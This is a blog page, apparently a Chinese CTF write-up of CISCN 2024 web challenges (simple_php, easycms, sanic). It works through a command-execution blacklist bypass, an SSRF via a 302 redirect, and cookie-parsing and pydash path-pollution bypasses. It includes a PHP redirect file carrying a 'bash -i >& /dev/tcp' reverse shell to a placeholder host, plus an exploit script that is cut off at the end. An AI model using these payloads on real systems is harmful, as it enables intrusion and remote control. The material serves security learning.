@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="simple_phpsimple_php: 思路流程 命令执行黑名单  S1: 先列出有哪些命令可以用，这里还是靠经验  就拼凑思路上来说，过滤太多又不回显是比较难拼凑的，搭个本地环境可以测试，用docker搭建比较好    1234# 不太行-base32rev   过滤有点多，先考虑编码绕过，shell的编码函数被ban了，有没有别的编码函数？php里有，怎么在shell中使用php？php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn24">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/12/01/ciscn24/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="simple_phpsimple_php: 思路流程 命令执行黑名单  S1: 先列出有哪些命令可以用，这里还是靠经验  就拼凑思路上来说，过滤太多又不回显是比较难拼凑的，搭个本地环境可以测试，用docker搭建比较好    1234# 不太行-base32rev   过滤有点多，先考虑编码绕过，shell的编码函数被ban了，有没有别的编码函数？php里有，怎么在shell中使用php？php">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/ciscn24/easycms_testphp.png">
+<meta property="og:image" content="https://kc1zs4.github.io/pic/ciscn24/%E5%8F%AF%E8%83%BD%E7%9A%84ssrf.png">
+<meta property="article:published_time" content="2024-12-01T09:10:28.000Z">
+<meta property="article:modified_time" content="2024-12-14T14:29:41.678Z">
+<meta property="article:tag" content="recurrence">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kc1zs4.github.io/pic/ciscn24/easycms_testphp.png">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>ciscn24</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/04/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0linux%E4%B8%8B%E7%9A%84php%E7%8E%AF%E5%A2%83/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/01/Java%E5%AE%89%E5%85%A86(2)_Tomcat%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/12/01/ciscn24/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&text=ciscn24"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&is_video=false&description=ciscn24"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ciscn24&body=Check out this article: https://kc1zs4.github.io/2024/12/01/ciscn24/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&title=ciscn24"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/12/01/ciscn24/&name=ciscn24&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/12/01/ciscn24/&t=ciscn24"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">1.</span> <span class="toc-text">simple_php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-php-%E6%80%9D%E8%B7%AF%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">simple_php: 思路流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-php-%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">simple_php: 核心要点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">2.</span> <span class="toc-text">easycms</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easycms-%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">easycms: 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easycms-%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.</span> <span class="toc-text">easycms: 总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sanic"><span class="toc-number">3.</span> <span class="toc-text">sanic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic-%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.</span> <span class="toc-text">sanic: 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic-%E4%B8%8D%E5%AF%B9%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B9%88%E7%AE%80%E5%8D%95"><span class="toc-number">3.2.</span> <span class="toc-text">sanic: 不对没有这么简单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sanic-%E6%A0%B8%E5%BF%83%E8%A6%81%E7%82%B9"><span class="toc-number">3.3.</span> <span class="toc-text">sanic: 核心要点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mossfirn"><span class="toc-number">4.</span> <span class="toc-text">mossfirn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mossfirn-%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">mossfirn: 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mossfirn-%E8%A6%81%E7%82%B9"><span class="toc-number">4.2.</span> <span class="toc-text">mossfirn: 要点</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ciscn24
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-01T09:10:28.000Z" class="dt-published" itemprop="datePublished">2024-12-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><h3 id="simple-php-思路流程"><a href="#simple-php-思路流程" class="headerlink" title="simple_php: 思路流程"></a>simple_php: 思路流程</h3><ol>
+<li><p>命令执行黑名单</p>
+</li>
+<li><p><strong>S1: 先列出有哪些命令可以用</strong>，这里还是靠经验</p>
+<ol>
+<li><p>就拼凑思路上来说，过滤太多又不回显是比较难拼凑的，<strong>搭个本地环境可以测试</strong>，用docker搭建比较好</p>
+   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不太行</span></span><br><span class="line">-</span><br><span class="line">base32</span><br><span class="line">rev</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>过滤有点多，<strong>先考虑编码绕过</strong>，shell的编码函数被ban了，有没有别的编码函数？php里有，怎么在shell中使用php？<code>php -r</code>，ok</p>
+</li>
+<li><p>escapeshellcmd的影响，似乎有再套一层字符串，那就不是影响了再字符串里，找一下编码有<code>hexo2bin()</code>，构造一下payload<code>php -r system(hex2bin(6c73));</code></p>
+<ol>
+<li>报错，思路应该可以是这个，但是报错了<code>Parse error: syntax error, unexpected &#39;c73202d6c&#39; (T_STRING), expecting &#39;)&#39; in Command line code on line 1</code>，查了一下加自己思考感觉可能是变成数字了，现在只要解决这个问题就可以执行了</li>
+<li>经过测试可以使用0x表示十六进制，但是会转换成十进制，这里<strong>需要将数字-&gt;字符串</strong>，强制转换行不？可行，不过需要**非数字开头(这个点要敏感点)**，使用截取<ol>
+<li><strong>十进制短命令运行法(本地通，远不同)</strong>: 一开始总是用进制转换去解决<code>php -r system(hex2bin(dechex(strval(27763))));</code>，处理后是<code>php -r system\(hex2bin\(dechex\(strval\(27763\)\)\)\)\;</code>，不失为一种办法，虽然后面发现了对长度有限制，总之<strong>思路的还是很重要的，先选简单的</strong></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>这样就可以执行任意命令了，payload: <code>cmd=php -r system(hex2bin(substr(a6c73,1)));</code></p>
+</li>
+<li><p>本地找不到flag文件，并且环境变量中也没有，考虑数据库，<code>cat /etc/passwd</code></p>
+</li>
+<li><p>发现mysql，我们当前用户为www-data，还有知道一个root，试一试有没有机会，最终在<code>mysql -u www-data;echo $?</code>成功获取返回0，妙</p>
+<ol>
+<li>mysql后面就是，root用户试一下，www-data里的test是空的不行<code>mysql -u root -p&#39;root&#39; -e &quot;use PHP_CMS;select * from Flag_jdjvn&quot;</code>这样转成hex然后执行</li>
+</ol>
+</li>
+</ol>
+<h3 id="simple-php-核心要点"><a href="#simple-php-核心要点" class="headerlink" title="simple_php: 核心要点"></a>simple_php: 核心要点</h3><ol>
+<li><p><strong>重要的是深入细化问题</strong></p>
+<ol>
+<li>什么对什么的什么做了什么事情，比如黑名单对bash的编码进行了过滤，就可以考虑使用php中的来实现</li>
+</ol>
+</li>
+<li><p><strong>对于过滤问题</strong></p>
+<ol>
+<li><p>注意到escpaeshellcmd作用的原理是添加\，传入cmd后作为字符串并不会有影响，这里只是防止绕过在本php页面处理而已，仍然可以使用那些字符，其实可以<strong>转为绕过引号的在shell里</strong></p>
+</li>
+<li><p>可以列一下哪些常用命令还可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-</span><br><span class="line">php</span><br><span class="line">rev</span><br><span class="line">paste</span><br><span class="line">base32</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>命令执行-&gt;代码执行-&gt;命令执行现在是一个普遍的知识点了</p>
+</li>
+<li><p>数据库有些也是考察的内容，flag藏在里面</p>
+<ol>
+<li>哪里能藏东西？环境变量，然后就是数据库了</li>
+</ol>
+</li>
+<li><p>mysql可以非交互式地进行查询，参数可以看文档&#x2F;搜索&#x2F;–help猜-e</p>
+</li>
+<li><p><strong>坑点</strong></p>
+<ol>
+<li><code>mysql -u root -p&#39;root&#39;</code>中的p后不能有空格</li>
+<li>对于跑不通的命令比赛就别死磕了，试试别的思路，比如这里本地通ctfsow不通</li>
+</ol>
+</li>
+</ol>
+<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><h3 id="easycms-思路"><a href="#easycms-思路" class="headerlink" title="easycms: 思路"></a>easycms: 思路</h3><blockquote>
+<p>看起来又像是信息题？</p>
+</blockquote>
+<ol>
+<li>失败的尝试<ol>
+<li>github种的readme看后，有test.php</li>
+<li>没有具体的思路方向来呜呜，看题解 –&gt; ？admin.php可以访问到啊，ctfshow是不是没有整理干净啊，算了</li>
+</ol>
+</li>
+<li>复现<ol>
+<li>dirsearch开扫，有Readme.txt，后台没法爆破36乃至更多的四次方，有点难搞了，<strong>需要一个无需后台验证的方法</strong>，并且可以打ssrf到flag.php那里，可以任意命令执行</li>
+<li>test.php种有版本信息<br><img src="/pic/ciscn24/easycms_testphp.png" alt="pic"></li>
+<li>找找历史漏洞，官网&#x2F;github上的issue这些，关键词：漏洞，vul，bug<ol>
+<li>[<a target="_blank" rel="noopener" href="https://www.xunruicms.com/bug/]">https://www.xunruicms.com/bug/]</a></li>
+</ol>
+</li>
+<li>有一个可疑的ssrf？**直接搜qrcode，有一个dr_qrcode()**，看看文档<br><img src="/pic/ciscn24/%E5%8F%AF%E8%83%BD%E7%9A%84ssrf.png" alt="pic"></li>
+<li><strong>clone个源码，并看着文档来审一下[<a target="_blank" rel="noopener" href="https://www.xunruicms.com/doc/203.html]">https://www.xunruicms.com/doc/203.html]</a></strong></li>
+<li>先暂时停留在这里吧<code>?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&amp;text=xxxx:9999/1.php&amp;size=5&amp;level=H</code></li>
+</ol>
+</li>
+<li>时隔n天，我回来了，把php环境搞清楚了<ol>
+<li><p>这里加个GIF89a</p>
+</li>
+<li><p>Docker起个服务302外力使其跳转，先<code>?s=api&amp;c=api&amp;m=qrcode&amp;thumb=&amp;text=http://xxxx:9999/1.php&amp;size=5&amp;level=H</code><strong>注意要<code>http://xxxx:9999</code></strong></p>
+<ol>
+<li>注意header之前不能有输出，ai说的</li>
+<li>可以加个日志来实现自动记录</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 反弹shell</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx/9999 0&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="variable">$evil</span> = <span class="string">&quot;Location: http://127.0.0.1/flag.php?cmd=&quot;</span>.<span class="variable">$cmd</span>;</span><br><span class="line"><span class="comment">// 设置重定向头信息</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="variable">$evil</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这里ctfshow搞不出来，看了网上大家都这样</p>
+</li>
+</ol>
+</li>
+</ol>
+<h3 id="easycms-总结"><a href="#easycms-总结" class="headerlink" title="easycms: 总结"></a>easycms: 总结</h3><ol>
+<li>搜索+推断，这里qr_code的定位可以依赖于Api文档&#x2F;api文件，一般会是入口</li>
+<li>可以使用302跳转强制ssrf</li>
+</ol>
+<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><h3 id="sanic-思路"><a href="#sanic-思路" class="headerlink" title="sanic: 思路"></a>sanic: 思路</h3><ol>
+<li><p>尝试</p>
+<ol>
+<li>有源码，很明显的lower绕过加原型链污染</li>
+<li>又完damn了，网上找不到一点信息，很明显的lower眼前怎么就过不了呢？</li>
+</ol>
+</li>
+<li><p>题解wp环节</p>
+<ol>
+<li><p>原来要源码，<strong>网上找不到就看看源码吧</strong></p>
+</li>
+<li><p>在输入端似乎无法搞动作，看看**接收端的解析规则(一入一出很合理啊)**，进到sanic去看看</p>
+<ol>
+<li><p>login的解析对象request是谁，打印出来看看，这一看不要紧，原来是<code>&lt;class &#39;sanic.request.types.Request&#39;&gt;</code>，不错，有入口了</p>
+</li>
+<li><p>再对于模块中找到cookie，在一步一步深入，发现了以下这段代码(找到和wp一样的了)，<strong>还是要审细一点，看漏了耽搁了半小时wc</strong></p>
+<ol>
+<li>第一个用来过滤特殊的字符</li>
+<li>允许八进制\077这样</li>
+<li><code>[\\]</code>：匹配反斜杠。<code>.</code>：匹配任意单个字符（除了换行符</li>
+<li><strong>结论: 需要使用引号包裹八进制字符来绕过session的检查</strong></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析链</span></span><br><span class="line"><span class="built_in">print</span>(request)    <span class="comment"># 在/login中加的，用于判断类型&lt;class &#x27;sanic.request.types.Request&#x27;&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:   <span class="comment"># pycharm中可以搜索sanic.request.types.Request</span></span><br><span class="line"><span class="variable language_">self</span>.get_cookies()</span><br><span class="line"><span class="variable language_">self</span>.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))  <span class="comment"># 进入到parsed_cookie中</span></span><br><span class="line">value = _unquote(value)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">COOKIE_NAME_RESERVED_CHARS = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">&#x27;[\x00-\x1f\x7f-\xff()&lt;&gt;@,;:\\\\&quot;/[\\]?=&#123;&#125; \x09]&#x27;</span></span><br><span class="line">)</span><br><span class="line">OCTAL_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;\\[0-3][0-7][0-7]&quot;</span>)</span><br><span class="line">QUOTE_PATTERN = re.<span class="built_in">compile</span>(<span class="string">r&quot;[\\].&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># !!! 关键的调用处如下</span></span><br><span class="line"><span class="keyword">if</span> COOKIE_NAME_RESERVED_CHARS.search(name):  <span class="comment"># no cov</span></span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">2</span> <span class="keyword">and</span> value[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> value[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:  <span class="comment"># no cov</span></span><br><span class="line">   value = _unquote(value) <span class="comment"># 在_unquote中才有对OCTAL_PATTERN和QUOTE_PATTERN的引用</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>绕过;后现在有需要搞_.的绕过了，查查资料，不行看源码吧</p>
+<ol>
+<li><p>这里的目标应该可以是&#x2F;src的<code>__file__</code>，也就是修改全局变量的方式，那能到哪里去呢？任意文件读取，&#x2F;proc&#x2F;1&#x2F;environ，应该就这里，感觉到不了rce</p>
+</li>
+<li><p>绕过</p>
+<ol>
+<li>这里网上找不到，看看解析的源码，pydash5.1.12中的，重点关注路径那里就ok了</li>
+<li>真找到了</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_LIST_INDEX = re.<span class="built_in">compile</span>(<span class="string">r&quot;^\[\d+\]$&quot;</span>)</span><br><span class="line"><span class="comment"># 结合过滤在python中使用&quot;_\\\\.&quot;来进行绕过</span></span><br><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>最终payload与分析链</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分析链</span></span><br><span class="line">pydash.set_(pollute, key, value)</span><br><span class="line"><span class="keyword">return</span> set_with(obj, path, value)</span><br><span class="line"><span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br><span class="line">tokens = to_path_tokens(path)    <span class="comment"># 这一步敏感，因为我们的目的就是path的解析</span></span><br><span class="line">keys = [</span><br><span class="line">         PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">         <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">         <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">         <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">     ]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://e4630784-9448-45a8-9d3c-65652b721aaf.challenge.ctf.show/&quot;</span></span><br><span class="line">route1 = <span class="string">&quot;login/&quot;</span></span><br><span class="line">route2 = <span class="string">&quot;admin/&quot;</span></span><br><span class="line">route3 = <span class="string">&quot;src/&quot;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Session 对象</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置初始的 cookies</span></span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span>)   <span class="comment"># 要有引号包起来</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送带有特定 cookie 的 GET 请求到 login 路由</span></span><br><span class="line">r = session.get(host + route1, proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[1]----------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发送 POST 请求到 admin 路由，包含特定的 json 数据</span></span><br><span class="line">path_data = &#123;</span><br><span class="line">    <span 